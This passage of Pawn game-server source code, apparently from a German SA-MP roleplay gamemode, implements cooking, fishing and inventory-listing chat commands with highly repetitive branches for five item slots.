							format(string, sizeof(string), "* Du hast %s (LBS: %d) gekocht.",Cooking[playerid][pCook3],Cooking[playerid][pCWeight3]);
							SendClientMessage(playerid,COLOR_LIGHTBLUE, string);
			    		}
						else if(fishid == 4)
						{
							format(string, sizeof(string), "Gekochte/r/s %s", Fishes[playerid][pFish4]);
							strmid(Cooking[playerid][pCook3], string, 0, strlen(string), 255);
							Cooking[playerid][pCWeight3] = Fishes[playerid][pWeight4];
							Cooking[playerid][pCookID3] = Fishes[playerid][pFid4];
							format(string, sizeof(string), "* Du hast %s (LBS: %d) gekocht.",Cooking[playerid][pCook3],Cooking[playerid][pCWeight3]);
							SendClientMessage(playerid,COLOR_LIGHTBLUE, string);
			    		}
						else if(fishid == 5)
						{
							format(string, sizeof(string), "Gekochte/r/s %s", Fishes[playerid][pFish5]);
							strmid(Cooking[playerid][pCook3], string, 0, strlen(string), 255);
							Cooking[playerid][pCWeight3] = Fishes[playerid][pWeight5];
							Cooking[playerid][pCookID3] = Fishes[playerid][pFid5];
							format(string, sizeof(string), "* Du hast %s (LBS: %d) gekocht.",Cooking[playerid][pCook3],Cooking[playerid][pCWeight3]);
							SendClientMessage(playerid,COLOR_LIGHTBLUE, string);
			    		}
						found = 1;
   					}
					else if(Cooking[playerid][pCWeight4] == 0)
					{
						if(fishid == 1)
					    {
							format(string, sizeof(string), "Gekochte/r/s %s", Fishes[playerid][pFish1]);
							strmid(Cooking[playerid][pCook4], string, 0, strlen(string), 255);
							Cooking[playerid][pCWeight4] = Fishes[playerid][pWeight1];
							Cooking[playerid][pCookID4] = Fishes[playerid][pFid1];
							format(string, sizeof(string), "* Du hast %s (LBS: %d) gekocht.",Cooking[playerid][pCook4],Cooking[playerid][pCWeight4]);
							SendClientMessage(playerid,COLOR_LIGHTBLUE, string);
			    		}
						else if(fishid == 2)
						{
							format(string, sizeof(string), "Gekochte/r/s %s", Fishes[playerid][pFish2]);
							strmid(Cooking[playerid][pCook4], string, 0, strlen(string), 255);
							Cooking[playerid][pCWeight4] = Fishes[playerid][pWeight2];
							Cooking[playerid][pCookID4] = Fishes[playerid][pFid2];
							format(string, sizeof(string), "* Du hast %s (LBS: %d) gekocht.",Cooking[playerid][pCook4],Cooking[playerid][pCWeight4]);
							SendClientMessage(playerid,COLOR_LIGHTBLUE, string);
			    		}
						else if(fishid == 3)
						{
							format(string, sizeof(string), "Gekochte/r/s %s", Fishes[playerid][pFish3]);
							strmid(Cooking[playerid][pCook4], string, 0, strlen(string), 255);
							Cooking[playerid][pCWeight4] = Fishes[playerid][pWeight3];
							Cooking[playerid][pCookID4] = Fishes[playerid][pFid3];
							format(string, sizeof(string), "* Du hast %s (LBS: %d) gekocht.",Cooking[playerid][pCook4],Cooking[playerid][pCWeight4]);
							SendClientMessage(playerid,COLOR_LIGHTBLUE, string);
			    		}
						else if(fishid == 4)
						{
							format(string, sizeof(string), "Gekochte/r/s %s", Fishes[playerid][pFish4]);
							strmid(Cooking[playerid][pCook4], string, 0, strlen(string), 255);
							Cooking[playerid][pCWeight4] = Fishes[playerid][pWeight4];
							Cooking[playerid][pCookID4] = Fishes[playerid][pFid4];
							format(string, sizeof(string), "* Du hast %s (LBS: %d) gekocht.",Cooking[playerid][pCook4],Cooking[playerid][pCWeight4]);
							SendClientMessage(playerid,COLOR_LIGHTBLUE, string);
			    		}
						else if(fishid == 5)
						{
							format(string, sizeof(string), "Gekochte/r/s %s", Fishes[playerid][pFish5]);
							strmid(Cooking[playerid][pCook4], string, 0, strlen(string), 255);
							Cooking[playerid][pCWeight4] = Fishes[playerid][pWeight5];
							Cooking[playerid][pCookID4] = Fishes[playerid][pFid5];
							format(string, sizeof(string), "* Du hast %s (LBS: %d) gekocht.",Cooking[playerid][pCook4],Cooking[playerid][pCWeight4]);
							SendClientMessage(playerid,COLOR_LIGHTBLUE, string);
    					}
						found = 1;
		    		}
					else if(Cooking[playerid][pCWeight5] == 0)
					{
						if(fishid == 1)
					    {
							format(string, sizeof(string), "Gekochte/r/s %s", Fishes[playerid][pFish1]);
							strmid(Cooking[playerid][pCook5], string, 0, strlen(string), 255);
							Cooking[playerid][pCWeight5] = Fishes[playerid][pWeight1];
							Cooking[playerid][pCookID5] = Fishes[playerid][pFid1];
							format(string, sizeof(string), "* Du hast %s (LBS: %d) gekocht.",Cooking[playerid][pCook5],Cooking[playerid][pCWeight5]);
							SendClientMessage(playerid,COLOR_LIGHTBLUE, string);
			    		}
						else if(fishid == 2)
						{
							format(string, sizeof(string), "Gekochte/r/s %s", Fishes[playerid][pFish2]);
							strmid(Cooking[playerid][pCook5], string, 0, strlen(string), 255);
							Cooking[playerid][pCWeight5] = Fishes[playerid][pWeight2];
							Cooking[playerid][pCookID5] = Fishes[playerid][pFid2];
							format(string, sizeof(string), "* Du hast %s (LBS: %d) gekocht.",Cooking[playerid][pCook5],Cooking[playerid][pCWeight5]);
							SendClientMessage(playerid,COLOR_LIGHTBLUE, string);
			    		}
						else if(fishid == 3)
						{
							format(string, sizeof(string), "Gekochte/r/s %s", Fishes[playerid][pFish3]);
							strmid(Cooking[playerid][pCook5], string, 0, strlen(string), 255);
							Cooking[playerid][pCWeight5] = Fishes[playerid][pWeight3];
							Cooking[playerid][pCookID5] = Fishes[playerid][pFid3];
							format(string, sizeof(string), "* Du hast %s (LBS: %d) gekocht.",Cooking[playerid][pCook5],Cooking[playerid][pCWeight5]);
							SendClientMessage(playerid,COLOR_LIGHTBLUE, string);
			    		}
						else if(fishid == 4)
						{
							format(string, sizeof(string), "Gekochte/r/s %s", Fishes[playerid][pFish4]);
							strmid(Cooking[playerid][pCook5], string, 0, strlen(string), 255);
							Cooking[playerid][pCWeight5] = Fishes[playerid][pWeight4];
							Cooking[playerid][pCookID5] = Fishes[playerid][pFid4];
							format(string, sizeof(string), "* Du hast %s (LBS: %d) gekocht.",Cooking[playerid][pCook5],Cooking[playerid][pCWeight5]);
							SendClientMessage(playerid,COLOR_LIGHTBLUE, string);
			    		}
						else if(fishid == 5)
						{
							format(string, sizeof(string), "Gekochte/r/s %s", Fishes[playerid][pFish5]);
							strmid(Cooking[playerid][pCook5], string, 0, strlen(string), 255);
							Cooking[playerid][pCWeight5] = Fishes[playerid][pWeight5];
							Cooking[playerid][pCookID5] = Fishes[playerid][pFid5];
							format(string, sizeof(string), "* Du hast %s (LBS: %d) gekocht.",Cooking[playerid][pCook5],Cooking[playerid][pCWeight5]);
							SendClientMessage(playerid,COLOR_LIGHTBLUE, string);
			    		}
						found = 1;
   					}
					else
					{
						SendClientMessage(playerid, COLOR_GREY, "   Du hast keinen Platz in deinem Kochbehälter !");
					    return 1;
		    		}
					if(found)
					{
					    ClearFishID(playerid, fishid);
						Fishes[playerid][pLastFish] = 0;
			   			Fishes[playerid][pFishID] = 0;
					}
				}
				else if(strcmp(x_nr,"Huhn",true) == 0)
				{
				    if(IsPlayerInRangeOfPoint(playerid,3.0,369.9786,-4.0798,1001.8589))
				    {//Cluckin Bell
				        if(Groceries[playerid][pChicken] != 0)
				        {
				            if(Cooking[playerid][pCWeight1] == 0)
						    {
							    format(string, sizeof(string), "Gekochtes Huhn");
							    strmid(Cooking[playerid][pCook1], string, 0, strlen(string), 255);
							    Cooking[playerid][pCWeight1] = Groceries[playerid][pChicken];
							    Cooking[playerid][pCookID1] = 30;
							    Groceries[playerid][pChickens] = 0; Groceries[playerid][pChicken] = 0;
							    format(string, sizeof(string), "* Du hast %s (Gewicht: %d) gekocht.",Cooking[playerid][pCook1],Cooking[playerid][pCWeight1]);
							    SendClientMessage(playerid,COLOR_LIGHTBLUE, string);
						    }
						    else if(Cooking[playerid][pCWeight2] == 0)
						    {
							    format(string, sizeof(string), "Gekochtes Huhn");
							    strmid(Cooking[playerid][pCook2], string, 0, strlen(string), 255);
							    Cooking[playerid][pCWeight2] = Groceries[playerid][pChicken];
							    Cooking[playerid][pCookID2] = 30;
							    Groceries[playerid][pChickens] = 0; Groceries[playerid][pChicken] = 0;
							    format(string, sizeof(string), "* Du hast %s (Gewicht: %d) gekocht.",Cooking[playerid][pCook2],Cooking[playerid][pCWeight2]);
							    SendClientMessage(playerid,COLOR_LIGHTBLUE, string);
						    }
						    else if(Cooking[playerid][pCWeight3] == 0)
						    {
							    format(string, sizeof(string), "Gekochtes Huhn");
							    strmid(Cooking[playerid][pCook3], string, 0, strlen(string), 255);
							    Cooking[playerid][pCWeight3] = Groceries[playerid][pChicken];
							    Cooking[playerid][pCookID3] = 30;
							    Groceries[playerid][pChickens] = 0; Groceries[playerid][pChicken] = 0;
							    format(string, sizeof(string), "* Du hast %s (Gewicht: %d) gekocht.",Cooking[playerid][pCook3],Cooking[playerid][pCWeight3]);
							    SendClientMessage(playerid,COLOR_LIGHTBLUE, string);
						    }
						    else if(Cooking[playerid][pCWeight4] == 0)
						    {
							    format(string, sizeof(string), "Gekochtes Huhn");
							    strmid(Cooking[playerid][pCook4], string, 0, strlen(string), 255);
							    Cooking[playerid][pCWeight4] = Groceries[playerid][pChicken];
							    Cooking[playerid][pCookID4] = 30;
							    Groceries[playerid][pChickens] = 0; Groceries[playerid][pChicken] = 0;
							    format(string, sizeof(string), "* Du hast %s (Gewicht: %d) gekocht.",Cooking[playerid][pCook4],Cooking[playerid][pCWeight4]);
							    SendClientMessage(playerid,COLOR_LIGHTBLUE, string);
						    }
						    else if(Cooking[playerid][pCWeight5] == 0)
						    {
							    format(string, sizeof(string), "Gekochtes Huhn");
							    strmid(Cooking[playerid][pCook5], string, 0, strlen(string), 255);
							    Cooking[playerid][pCWeight5] = Groceries[playerid][pChicken];
							    Cooking[playerid][pCookID5] = 30;
							    Groceries[playerid][pChickens] = 0; Groceries[playerid][pChicken] = 0;
							    format(string, sizeof(string), "* Du hast %s (Gewicht: %d) gekocht.",Cooking[playerid][pCook5],Cooking[playerid][pCWeight5]);
							    SendClientMessage(playerid,COLOR_LIGHTBLUE, string);
						    }
						    else
						    {
						        SendClientMessage(playerid, COLOR_GREY, "   Du hast keinen Platz in deinem Kochbehälter !");
						        return 1;
						    }
				        }
				        else
				        {
				            SendClientMessage(playerid, COLOR_GREY, "   Du hast kein Huhn dabei !");
				            return 1;
				        }
				    }
				    else
				    {
				        SendClientMessage(playerid, COLOR_GREY, "   Du musst im Cluckin' Bell Restaurant sein, um ein Huhn zu kochen !");
					    return 1;
				    }
				}
				else if(strcmp(x_nr,"Hamburger",true) == 0)
				{
				    if(IsPlayerInRangeOfPoint(playerid,3.0,376.4466,-60.9574,1001.5078) || IsPlayerInRangeOfPoint(playerid,3.0,378.1215,-57.4928,1001.5078))
					{//Burgershot
					    if(Groceries[playerid][pHamburger] != 0)
				        {
				            if(Cooking[playerid][pCWeight1] == 0)
						    {
							    format(string, sizeof(string), "Warmer Hamburger");
							    strmid(Cooking[playerid][pCook1], string, 0, strlen(string), 255);
							    Cooking[playerid][pCWeight1] = Groceries[playerid][pHamburger];
							    Cooking[playerid][pCookID1] = 30;
							    Groceries[playerid][pHamburgers] = 0; Groceries[playerid][pHamburger] = 0;
							    format(string, sizeof(string), "* Du hast %s (Gewicht: %d) gekocht.",Cooking[playerid][pCook1],Cooking[playerid][pCWeight1]);
							    SendClientMessage(playerid,COLOR_LIGHTBLUE, string);
						    }
						    else if(Cooking[playerid][pCWeight2] == 0)
						    {
							    format(string, sizeof(string), "Warmer Hamburger");
							    strmid(Cooking[playerid][pCook2], string, 0, strlen(string), 255);
							    Cooking[playerid][pCWeight2] = Groceries[playerid][pHamburger];
							    Cooking[playerid][pCookID2] = 30;
							    Groceries[playerid][pHamburgers] = 0; Groceries[playerid][pHamburger] = 0;
							    format(string, sizeof(string), "* Du hast %s (Gewicht: %d) gekocht.",Cooking[playerid][pCook2],Cooking[playerid][pCWeight2]);
							    SendClientMessage(playerid,COLOR_LIGHTBLUE, string);
						    }
						    else if(Cooking[playerid][pCWeight3] == 0)
						    {
							    format(string, sizeof(string), "Warmer Hamburger");
							    strmid(Cooking[playerid][pCook3], string, 0, strlen(string), 255);
							    Cooking[playerid][pCWeight3] = Groceries[playerid][pHamburger];
							    Cooking[playerid][pCookID3] = 30;
							    Groceries[playerid][pHamburgers] = 0; Groceries[playerid][pHamburger] = 0;
							    format(string, sizeof(string), "* Du hast %s (Gewicht: %d) gekocht.",Cooking[playerid][pCook3],Cooking[playerid][pCWeight3]);
							    SendClientMessage(playerid,COLOR_LIGHTBLUE, string);
						    }
						    else if(Cooking[playerid][pCWeight4] == 0)
						    {
							    format(string, sizeof(string), "Warmer Hamburger");
							    strmid(Cooking[playerid][pCook4], string, 0, strlen(string), 255);
							    Cooking[playerid][pCWeight4] = Groceries[playerid][pHamburger];
							    Cooking[playerid][pCookID4] = 30;
							    Groceries[playerid][pHamburgers] = 0; Groceries[playerid][pHamburger] = 0;
							    format(string, sizeof(string), "* Du hast %s (Gewicht: %d) gekocht.",Cooking[playerid][pCook4],Cooking[playerid][pCWeight4]);
							    SendClientMessage(playerid,COLOR_LIGHTBLUE, string);
						    }
						    else if(Cooking[playerid][pCWeight5] == 0)
						    {
							    format(string, sizeof(string), "Warmer Hamburger");
							    strmid(Cooking[playerid][pCook5], string, 0, strlen(string), 255);
							    Cooking[playerid][pCWeight5] = Groceries[playerid][pHamburger];
							    Cooking[playerid][pCookID5] = 30;
							    Groceries[playerid][pHamburgers] = 0; Groceries[playerid][pHamburger] = 0;
							    format(string, sizeof(string), "* Du hast %s (Gewicht: %d) gekocht.",Cooking[playerid][pCook5],Cooking[playerid][pCWeight5]);
							    SendClientMessage(playerid,COLOR_LIGHTBLUE, string);
						    }
						    else
						    {
						        SendClientMessage(playerid, COLOR_GREY, "   Du hast keinen Platz in deinem Kochbehälter !");
						        return 1;
						    }
				        }
				        else
				        {
				            SendClientMessage(playerid, COLOR_GREY, "   Du hast keine Hamburger dabei !");
				            return 1;
				        }
					}
					else
					{
					    SendClientMessage(playerid, COLOR_GREY, "   Du musst im Burger Shot Restaurant sein, um Hamburger zu brutzeln !");
					    return 1;
					}
				}
				else if(strcmp(x_nr,"Pizza",true) == 0)
				{
				    if(IsPlayerInRangeOfPoint(playerid,3.0,374.1185,-113.6361,1001.4922) || IsPlayerInRangeOfPoint(playerid,3.0,377.7971,-113.7668,1001.4922))
					{//Well Stacked Pizza
					    if(Groceries[playerid][pPizza] != 0)
				        {
				            if(Cooking[playerid][pCWeight1] == 0)
						    {
							    format(string, sizeof(string), "Gebackene Pizza");
							    strmid(Cooking[playerid][pCook1], string, 0, strlen(string), 255);
							    Cooking[playerid][pCWeight1] = Groceries[playerid][pHamburger];
							    Cooking[playerid][pCookID1] = 30;
							    Groceries[playerid][pPizzas] = 0; Groceries[playerid][pPizza] = 0;
							    format(string, sizeof(string), "* Du hast %s (Gewicht: %d) gekocht.",Cooking[playerid][pCook1],Cooking[playerid][pCWeight1]);
							    SendClientMessage(playerid,COLOR_LIGHTBLUE, string);
						    }
						    else if(Cooking[playerid][pCWeight2] == 0)
						    {
							    format(string, sizeof(string), "Gebackene Pizza");
							    strmid(Cooking[playerid][pCook2], string, 0, strlen(string), 255);
							    Cooking[playerid][pCWeight2] = Groceries[playerid][pHamburger];
							    Cooking[playerid][pCookID2] = 30;
							    Groceries[playerid][pPizzas] = 0; Groceries[playerid][pPizza] = 0;
							    format(string, sizeof(string), "* Du hast %s (Gewicht: %d) gekocht.",Cooking[playerid][pCook2],Cooking[playerid][pCWeight2]);
							    SendClientMessage(playerid,COLOR_LIGHTBLUE, string);
						    }
						    else if(Cooking[playerid][pCWeight3] == 0)
						    {
							    format(string, sizeof(string), "Gebackene Pizza");
							    strmid(Cooking[playerid][pCook3], string, 0, strlen(string), 255);
							    Cooking[playerid][pCWeight3] = Groceries[playerid][pHamburger];
							    Cooking[playerid][pCookID3] = 30;
							    Groceries[playerid][pPizzas] = 0; Groceries[playerid][pPizza] = 0;
							    format(string, sizeof(string), "* Du hast %s (Gewicht: %d) gekocht.",Cooking[playerid][pCook3],Cooking[playerid][pCWeight3]);
							    SendClientMessage(playerid,COLOR_LIGHTBLUE, string);
						    }
						    else if(Cooking[playerid][pCWeight4] == 0)
						    {
							    format(string, sizeof(string), "Gebackene Pizza");
							    strmid(Cooking[playerid][pCook4], string, 0, strlen(string), 255);
							    Cooking[playerid][pCWeight4] = Groceries[playerid][pHamburger];
							    Cooking[playerid][pCookID4] = 30;
							    Groceries[playerid][pPizzas] = 0; Groceries[playerid][pPizza] = 0;
							    format(string, sizeof(string), "* Du hast %s (Gewicht: %d) gekocht.",Cooking[playerid][pCook4],Cooking[playerid][pCWeight4]);
							    SendClientMessage(playerid,COLOR_LIGHTBLUE, string);
						    }
						    else if(Cooking[playerid][pCWeight5] == 0)
						    {
							    format(string, sizeof(string), "Gebackene Pizza");
							    strmid(Cooking[playerid][pCook5], string, 0, strlen(string), 255);
							    Cooking[playerid][pCWeight5] = Groceries[playerid][pHamburger];
							    Cooking[playerid][pCookID5] = 30;
							    Groceries[playerid][pPizzas] = 0; Groceries[playerid][pPizza] = 0;
							    format(string, sizeof(string), "* Du hast %s (Gewicht: %d) gekocht.",Cooking[playerid][pCook5],Cooking[playerid][pCWeight5]);
							    SendClientMessage(playerid,COLOR_LIGHTBLUE, string);
						    }
						    else
						    {
						        SendClientMessage(playerid, COLOR_GREY, "   Du hast keinen Platz in deinem Kochbehälter !");
						        return 1;
						    }
				        }
				        else
				        {
				            SendClientMessage(playerid, COLOR_GREY, "   Du hast keine Pizzas dabei !");
				            return 1;
				        }
					}
					else
					{
					    SendClientMessage(playerid, COLOR_GREY, "   Du musst im Well Stacked Pizza Restaurant sein, um Pizza zu backen !");
					    return 1;
					}
				}
				else
				{
				    SendClientMessage(playerid, COLOR_GREY, "   Unbekannter Koch-Name!");
				    return 1;
				}
	        }
	        else
	        {
	            SendClientMessage(playerid, COLOR_GREY, "   Hier kannst du kein Essen zubereiten!");
	            return 1;
	        }
	    }
	    return 1;
	}
	if(strcmp(cmd,"/cooked",true)==0)
    {
        if(IsPlayerConnected(playerid))
	    {
	        SendClientMessage(playerid, COLOR_WHITE, "|__________________ Kochbehälter __________________|");
	        format(string, sizeof(string), "** (1) Inhalt: %s.   Gewicht: %d.", Cooking[playerid][pCook1], Cooking[playerid][pCWeight1]);
			SendClientMessage(playerid, COLOR_GREY, string);
			format(string, sizeof(string), "** (2) Inhalt: %s.   Gewicht: %d.", Cooking[playerid][pCook2], Cooking[playerid][pCWeight2]);
			SendClientMessage(playerid, COLOR_GREY, string);
			format(string, sizeof(string), "** (3) Inhalt: %s.   Gewicht: %d.", Cooking[playerid][pCook3], Cooking[playerid][pCWeight3]);
			SendClientMessage(playerid, COLOR_GREY, string);
			format(string, sizeof(string), "** (4) Inhalt: %s.   Gewicht: %d.", Cooking[playerid][pCook4], Cooking[playerid][pCWeight4]);
			SendClientMessage(playerid, COLOR_GREY, string);
			format(string, sizeof(string), "** (5) Inhalt: %s.   Gewicht: %d.", Cooking[playerid][pCook5], Cooking[playerid][pCWeight5]);
			SendClientMessage(playerid, COLOR_GREY, string);
			SendClientMessage(playerid, COLOR_WHITE, "|____________________________________________|");
		}
	    return 1;
 	}
	if(strcmp(cmd,"/fish",true)==0)
    {
        if(IsPlayerConnected(playerid))
	        {
			        if(IsAtFishPlace(playerid))
				    {


		        if(Fishes[playerid][pWeight1] > 0 && Fishes[playerid][pWeight2] > 0 && Fishes[playerid][pWeight3] > 0 && Fishes[playerid][pWeight4] > 0 && Fishes[playerid][pWeight5] > 0)
		        {
		            SendClientMessage(playerid, COLOR_GREY, "   Du hast bereits 5 Fische gefangen, esse oder verkaufe sie zuerst !");
		            return 1;
		        }
		        new Veh = GetPlayerVehicleID(playerid);
		        if((IsAtFishPlace(playerid)) || IsABoat(Veh))
		        {
		            new Caught;
		            new rand;
		            new fstring[MAX_PLAYER_NAME];
		            new Level = PlayerInfo[playerid][pFishSkill];
	            	if(Level >= 0 && Level <= 50) { Caught = random(20)-7; }
		            else if(Level >= 51 && Level <= 100) { Caught = random(50)-20; }
		            else if(Level >= 101 && Level <= 200) { Caught = random(100)-50; }
		            else if(Level >= 201 && Level <= 400) { Caught = random(160)-60; }
		            else if(Level >= 401) { Caught = random(180)-70; }
		            rand = random(FishNamesNumber);
		            if(rand == 0)
		            {
		                SendClientMessage(playerid, COLOR_GREY, "   Du hast eine Jacke gefangen und wirfst sie zurück!");
		                return 1;
		            }
		            else if(rand == 4)
		            {
		                SendClientMessage(playerid, COLOR_GREY, "   Du hast eine Hose gefangen und wirfst sie zurück!");
		                return 1;
		            }
		            else if(rand == 7)
		            {
		                SendClientMessage(playerid, COLOR_GREY, "   Du hast eine Gießkanne gefangen und wirfst sie zurück!");
		                return 1;
		            }
		            else if(rand == 10)
		            {
		                SendClientMessage(playerid, COLOR_GREY, "   Du hast ein Paar Schuhe gefangen und wirfst sie zurück!");
		                return 1;
		            }
		            else if(rand == 13)
		            {
		                SendClientMessage(playerid, COLOR_GREY, "   Du hast einen Autoreifen gefangen und wirfst ihn zurück!");
		                return 1;
		            }
		            else if(rand == 20)
		            {
		                new mrand = random(500);
		                format(string, sizeof(string), "* Du hast einen Geldbeutel gefangen! Inhalt: $%d.", mrand);
						SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
		                GivePlayerMoneySave(playerid, mrand);
		                return 1;
					}
					else if(Caught < 0)
					{
					    SendClientMessage(playerid, COLOR_GRAD1, " Deine Angelschnur ist gerissen!");
					    return 1;
					}
			        if(Fishes[playerid][pWeight1] == 0)
			        {
			        	PlayerInfo[playerid][pFishes] += 1;
			            PlayerInfo[playerid][pFishSkill] += 1;
			            format(fstring, sizeof(fstring), "%s", FishNames[rand]);
						strmid(Fishes[playerid][pFish1], fstring, 0, strlen(fstring), 255);
						if(Caught > 0)
							Fishes[playerid][pWeight1] = Caught;
						else Fishes[playerid][pWeight1] = 1;
						format(string, sizeof(string), "Du hast ein %s mit %d LBS gefangen.", Fishes[playerid][pFish1], Caught);
						SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
						Fishes[playerid][pLastWeight] = Caught;
						Fishes[playerid][pLastFish] = 1;
						Fishes[playerid][pFid1] = rand;
						Fishes[playerid][pFishID] = rand;
						if(Caught > PlayerInfo[playerid][pBiggestFish])
						{
						    format(string, sizeof(string), "* Dein schwerster Fisch mit %d Gewicht wurde mit diesem Fisch(Gewicht: %d) übertroffen.", PlayerInfo[playerid][pBiggestFish], Caught);
							SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
							PlayerInfo[playerid][pBiggestFish] = Caught;
						}
	     			}
			        else if(Fishes[playerid][pWeight2] == 0)
			        {
			            PlayerInfo[playerid][pFishes] += 1;
			            PlayerInfo[playerid][pFishSkill] += 1;
			            format(fstring, sizeof(fstring), "%s", FishNames[rand]);
						strmid(Fishes[playerid][pFish2], fstring, 0, strlen(fstring), 255);
						if(Caught > 0)
							Fishes[playerid][pWeight2] = Caught;
						else Fishes[playerid][pWeight2] = 1;
						format(string, sizeof(string), "Du hast ein %s mit %d LBS gefangen.", Fishes[playerid][pFish2], Caught);
						SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
						Fishes[playerid][pLastWeight] = Caught;
						Fishes[playerid][pLastFish] = 2;
						Fishes[playerid][pFid2] = rand;
						Fishes[playerid][pFishID] = rand;
						if(Caught > PlayerInfo[playerid][pBiggestFish])
						{
						    format(string, sizeof(string), "* Dein schwerster Fisch mit %d Gewicht wurde mit diesem Fisch(Gewicht: %d) übertroffen.", PlayerInfo[playerid][pBiggestFish], Caught);
							SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
							PlayerInfo[playerid][pBiggestFish] = Caught;
						}
			        }
			        else if(Fishes[playerid][pWeight3] == 0)
			        {
			            PlayerInfo[playerid][pFishes] += 1;
			            PlayerInfo[playerid][pFishSkill] += 1;
			            format(fstring, sizeof(fstring), "%s", FishNames[rand]);
						strmid(Fishes[playerid][pFish3], fstring, 0, strlen(fstring), 255);
						if(Caught > 0)
							Fishes[playerid][pWeight3] = Caught;
                        else Fishes[playerid][pWeight3] = 1;
						format(string, sizeof(string), "Du hast ein %s mit %d LBS gefangen.", Fishes[playerid][pFish3], Caught);
						SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
						Fishes[playerid][pLastWeight] = Caught;
						Fishes[playerid][pLastFish] = 3;
						Fishes[playerid][pFid3] = rand;
						Fishes[playerid][pFishID] = rand;
						if(Caught > PlayerInfo[playerid][pBiggestFish])
						{
						    format(string, sizeof(string), "* Dein schwerster Fisch mit %d Gewicht wurde mit diesem Fisch(Gewicht: %d) übertroffen.", PlayerInfo[playerid][pBiggestFish], Caught);
							SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
							PlayerInfo[playerid][pBiggestFish] = Caught;
						}
			        }
			        else if(Fishes[playerid][pWeight4] == 0)
			        {
			            PlayerInfo[playerid][pFishes] += 1;
			            PlayerInfo[playerid][pFishSkill] += 1;
			            format(fstring, sizeof(fstring), "%s", FishNames[rand]);
						strmid(Fishes[playerid][pFish4], fstring, 0, strlen(fstring), 255);
						if(Caught > 0)
							Fishes[playerid][pWeight4] = Caught;
					    else Fishes[playerid][pWeight4] = 1;
						format(string, sizeof(string), "Du hast ein %s mit %d LBS gefangen.", Fishes[playerid][pFish4], Caught);
						SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
						Fishes[playerid][pLastWeight] = Caught;
						Fishes[playerid][pLastFish] = 4;
						Fishes[playerid][pFid4] = rand;
						Fishes[playerid][pFishID] = rand;
						if(Caught > PlayerInfo[playerid][pBiggestFish])
						{
						    format(string, sizeof(string), "* Dein schwerster Fisch mit %d Gewicht wurde mit diesem Fisch(Gewicht: %d) übertroffen.", PlayerInfo[playerid][pBiggestFish], Caught);
							SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
							PlayerInfo[playerid][pBiggestFish] = Caught;
						}
			        }
			        else if(Fishes[playerid][pWeight5] == 0)
			        {
			            PlayerInfo[playerid][pFishes] += 1;
			            PlayerInfo[playerid][pFishSkill] += 1;
			            format(fstring, sizeof(fstring), "%s", FishNames[rand]);
						strmid(Fishes[playerid][pFish5], fstring, 0, strlen(fstring), 255);
						if(Caught > 0)
							Fishes[playerid][pWeight5] = Caught;
						else Fishes[playerid][pWeight5] = 1;
						format(string, sizeof(string), "Du hast ein %s mit %d LBS gefangen.", Fishes[playerid][pFish5], Caught);
						SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
						Fishes[playerid][pLastWeight] = Caught;
						Fishes[playerid][pLastFish] = 5;
						Fishes[playerid][pFid5] = rand;
						Fishes[playerid][pFishID] = rand;
						if(Caught > PlayerInfo[playerid][pBiggestFish])
						{
						    format(string, sizeof(string), "* Dein schwerster Fisch mit %d Gewicht wurde mit diesem Fisch(Gewicht: %d) übertroffen.", PlayerInfo[playerid][pBiggestFish], Caught);
							SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
							PlayerInfo[playerid][pBiggestFish] = Caught;
						}
			        }
			        else
			        {
			            SendClientMessage(playerid, COLOR_GREY, "Du kannst keinen Fisch mehr tragen !");
			            return 1;
			        }
		            if(PlayerInfo[playerid][pFishSkill] == 51)
					{ SendClientMessage(playerid, COLOR_YELLOW, "* Dein Angel-Skill ist nun auf 2 gestiegen. Du kannst nun schwerere Fische fangen."); }
					else if(PlayerInfo[playerid][pFishSkill] == 251)
					{ SendClientMessage(playerid, COLOR_YELLOW, "* Dein Angel-Skill ist nun auf 3 gestiegen. Du kannst nun schwerere Fische fangen."); }
					else if(PlayerInfo[playerid][pFishSkill] == 501)
					{ SendClientMessage(playerid, COLOR_YELLOW, "* Dein Angel-Skill ist nun auf 4 gestiegen. Du kannst nun schwerere Fische fangen."); }
					else if(PlayerInfo[playerid][pFishSkill] == 700)
					{ SendClientMessage(playerid, COLOR_YELLOW, "* Dein Angel-Skill ist nun auf 5 gestiegen. Du kannst nun schwerere Fische fangen."); }
		        }
		    }
	    }
	    return 1;
 	}
	if(strcmp(cmd,"/fishes",true)==0)
    {
        if(IsPlayerConnected(playerid))
	    {
	        SendClientMessage(playerid, COLOR_WHITE, "|__________________ Fische __________________|");
	        format(string, sizeof(string), "** (1) Fisch: %s.   Gewicht: %d.", Fishes[playerid][pFish1], Fishes[playerid][pWeight1]);
			SendClientMessage(playerid, COLOR_GREY, string);
			format(string, sizeof(string), "** (2) Fisch: %s.   Gewicht: %d.", Fishes[playerid][pFish2], Fishes[playerid][pWeight2]);
			SendClientMessage(playerid, COLOR_GREY, string);
			format(string, sizeof(string), "** (3) Fisch: %s.   Gewicht: %d.", Fishes[playerid][pFish3], Fishes[playerid][pWeight3]);
			SendClientMessage(playerid, COLOR_GREY, string);
			format(string, sizeof(string), "** (4) Fisch: %s.   Gewicht: %d.", Fishes[playerid][pFish4], Fishes[playerid][pWeight4]);
			SendClientMessage(playerid, COLOR_GREY, string);
			format(string, sizeof(string), "** (5) Fisch: %s.   Gewicht: %d.", Fishes[playerid][pFish5], Fishes[playerid][pWeight5]);
			SendClientMessage(playerid, COLOR_GREY, string);
			SendClientMessage(playerid, COLOR_WHITE, "|____________________________________________|");
		}
	    return 1;
 	}
 	if(strcmp(cmd,"/releasefish",true)==0)
	{
	    if(IsPlayerConnected(playerid))
	    {
			tmp = strtoknew(cmdtext, idx);
			if(!strlen(tmp))
			{
				SendClientMessage(playerid, COLOR_WHITE, "Benutze: /releasefish [Fisch]");
				return 1;
			}
			new fishid = strval(tmp);
			if(fishid < 1 || fishid > 5) { SendClientMessage(playerid, COLOR_GREY, "   Fischnummer muss zwischen 1 und 5 liegen !"); return 1; }
			else if(fishid == 1 && Fishes[playerid][pWeight1] < 1) { SendClientMessage(playerid, COLOR_GREY, "   Du hast keinen Fisch Nummer 1 gefangen !"); return 1; }
